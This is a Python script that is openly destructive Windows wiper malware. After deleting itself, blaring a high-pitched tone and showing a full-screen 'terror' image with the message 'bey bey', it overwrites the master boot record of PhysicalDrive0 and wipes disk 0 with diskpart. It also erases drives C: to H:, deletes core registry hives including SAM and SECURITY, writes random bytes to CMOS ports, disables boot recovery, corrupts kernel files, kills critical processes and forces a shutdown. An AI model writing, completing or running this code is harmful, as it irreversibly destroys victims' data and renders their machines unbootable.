import os
import sys
import time
import struct
import random
import ctypes
import subprocess
import tempfile
import base64
import threading
import shutil
import atexit

try:
    from PIL import Image, ImageDraw, ImageFont
except:
    os.system('pip install pillow --quiet')
    from PIL import Image, ImageDraw, ImageFont

try:
    import pygame
    import numpy as np
except:
    os.system('pip install pygame numpy --quiet')
    import pygame
    import numpy as np

try:
    import win32file
    import win32con
except:
    os.system('pip install pywin32 --quiet')
    import win32file
    import win32con

try:
    import tkinter as tk
except:
    pass

# ===== 1. SELF DESTRUCT =====
def self_destruct():
    try:
        def delete_me():
            try:
                os.remove(sys.argv[0])
            except:
                pass
        atexit.register(delete_me)
        threading.Timer(2.0, delete_me).start()
    except:
        pass

# ===== 2. SCREAMING SOUND =====
def play_scream():
    try:
        pygame.mixer.init()
        sample_rate = 44100
        duration = 8.0
        freq = 2000
        t = np.arange(sample_rate * duration) / sample_rate
        samples = np.sin(2 * np.pi * freq * t)
        samples = np.clip(samples * 25000, -32768, 32767).astype(np.int16)
        sound = pygame.sndarray.make_sound(samples)
        sound.play(-1)
        return sound
    except:
        return None

# ===== 3. GENERATE TERROR IMAGE =====
def generate_terror_image():
    try:
        width = 1920
        height = 1080
        image = Image.new('RGB', (width, height))
        pixels = image.load()
        
        for y in range(height):
            for x in range(width):
                r = random.randint(0, 255)
                g = random.randint(0, 255)
                b = random.randint(0, 255)
                if (x // 50 + y // 50) % 3 == 0:
                    r = (r + 128) % 256
                    g = (g + 64) % 256
                    b = (b + 192) % 256
                pixels[x, y] = (r, g, b)
        
        draw = ImageDraw.Draw(image)
        for i in range(20):
            x = random.randint(0, width)
            y = random.randint(0, height)
            r = random.randint(30, 100)
            draw.ellipse((x-r, y-r, x+r, y+r), fill=(255, 0, 0))
            draw.ellipse((x-r//2, y-r//2, x+r//2, y+r//2), fill=(0, 0, 0))
        
        temp_path = os.path.join(tempfile.gettempdir(), 'terror.bmp')
        image.save(temp_path, 'BMP')
        return temp_path
    except:
        return None

# ===== 4. SHOW FULLSCREEN IMAGE =====
def show_fullscreen_image(image_path):
    try:
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)
        root.configure(bg='black')
        
        from PIL import ImageTk
        img = Image.open(image_path)
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        img = img.resize((screen_width, screen_height))
        photo = ImageTk.PhotoImage(img)
        
        label = tk.Label(root, image=photo, bg='black')
        label.pack(fill=tk.BOTH, expand=True)
        
        root.update()
        return root, label, photo
    except:
        return None, None, None

# ===== 5. ANIMATED TEXT =====
def animate_text(text, duration=3):
    try:
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)
        root.configure(bg='black')
        
        label = tk.Label(root, text="", fg="red", bg="black", 
                        font=("Arial Black", 72), justify="center")
        label.pack(expand=True)
        
        for i in range(len(text) + 1):
            label.config(text=text[:i])
            root.update()
            time.sleep(0.15)
        
        time.sleep(duration)
        root.destroy()
    except:
        pass

# ===== 6. DESTROY MBR =====
def destroy_mbr():
    try:
        hDevice = win32file.CreateFile(
            r"\\.\PhysicalDrive0",
            win32con.GENERIC_WRITE,
            win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE,
            None,
            win32con.OPEN_EXISTING,
            0,
            None
        )
        if hDevice != -1:
            for i in range(100):
                random_data = os.urandom(512)
                win32file.WriteFile(hDevice, random_data, None)
            win32file.CloseHandle(hDevice)
    except:
        pass

# ===== 7. DESTROY PARTITIONS =====
def destroy_partitions():
    try:
        script = """
        select disk 0
        clean
        convert mbr
        create partition primary
        format fs=ntfs quick
        """
        with open('diskpart.txt', 'w') as f:
            f.write(script)
        subprocess.run(['diskpart', '/s', 'diskpart.txt'], capture_output=True)
        try:
            os.remove('diskpart.txt')
        except:
            pass
    except:
        pass

# ===== 8. DESTROY FILES =====
def destroy_all_files():
    try:
        drives = ['C:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\']
        for drive in drives:
            if os.path.exists(drive):
                try:
                    subprocess.run(['cipher', '/w', drive], capture_output=True, timeout=3)
                except:
                    pass
                try:
                    subprocess.run(f'rd /s /q "{drive}"', shell=True, capture_output=True, timeout=3)
                except:
                    pass
    except:
        pass

# ===== 9. DESTROY REGISTRY =====
def destroy_registry():
    try:
        keys = [
            "HKLM\\SYSTEM\\CurrentControlSet\\Control",
            "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKLM\\SYSTEM\\CurrentControlSet\\Services",
            "HKLM\\SAM",
            "HKLM\\SECURITY"
        ]
        for key in keys:
            try:
                subprocess.run(f'reg delete "{key}" /f', shell=True, capture_output=True, timeout=2)
            except:
                pass
    except:
        pass

# ===== 10. DESTROY BIOS =====
def destroy_bios():
    try:
        for i in range(256):
            try:
                port = 0x70 + (i % 16)
                ctypes.windll.kernel32._outp(port, random.randint(0, 255))
            except:
                pass
    except:
        pass

# ===== 11. PREVENT BOOT =====
def prevent_boot():
    try:
        subprocess.run('bcdedit /set {default} recoveryenabled No', shell=True, capture_output=True, timeout=2)
        subprocess.run('bcdedit /set {default} bootstatuspolicy ignoreallfailures', shell=True, capture_output=True, timeout=2)
        subprocess.run('bcdedit /set {default} displaybootmenu No', shell=True, capture_output=True, timeout=2)
        subprocess.run('bcdedit /set {default} bootems No', shell=True, capture_output=True, timeout=2)
    except:
        pass

# ===== 12. KILL PROCESSES =====
def kill_processes():
    try:
        processes = ['explorer.exe', 'svchost.exe', 'winlogon.exe', 'lsass.exe']
        for proc in processes:
            try:
                subprocess.run(f'taskkill /f /im {proc}', shell=True, capture_output=True, timeout=2)
            except:
                pass
    except:
        pass

# ===== 13. CORRUPT SYSTEM FILES =====
def corrupt_system_files():
    try:
        system_files = [
            'C:\\Windows\\System32\\ntoskrnl.exe',
            'C:\\Windows\\System32\\hal.dll',
            'C:\\Windows\\System32\\winload.exe',
            'C:\\Windows\\System32\\winload.efi',
            'C:\\Windows\\System32\\kernel32.dll',
            'C:\\Windows\\System32\\ntdll.dll'
        ]
        for file in system_files:
            if os.path.exists(file):
                try:
                    with open(file, 'wb') as f:
                        f.write(os.urandom(1024))
                except:
                    pass
    except:
        pass

# ===== 14. SHUTDOWN =====
def shutdown_system():
    try:
        subprocess.run('shutdown /s /f /t 0', shell=True, capture_output=True)
    except:
        pass

# ===== 15. MAIN =====
def main():
    try:
        self_destruct()
        sound = play_scream()
        img_path = generate_terror_image()
        if img_path:
            root, label, photo = show_fullscreen_image(img_path)
        
        time.sleep(8)
        animate_text("bey bey..... ):", duration=3)
        
        destroy_mbr()
        destroy_partitions()
        destroy_all_files()
        destroy_registry()
        destroy_bios()
        prevent_boot()
        corrupt_system_files()
        kill_processes()
        
        if sound:
            try:
                sound.stop()
            except:
                pass
        
        if root:
            try:
                root.destroy()
            except:
                pass
        
        shutdown_system()
        
    except Exception as e:
        try:
            shutdown_system()
        except:
            pass

if __name__ == "__main__":
    try:
        main()
    except:
        try:
            shutdown_system()
        except:
            pass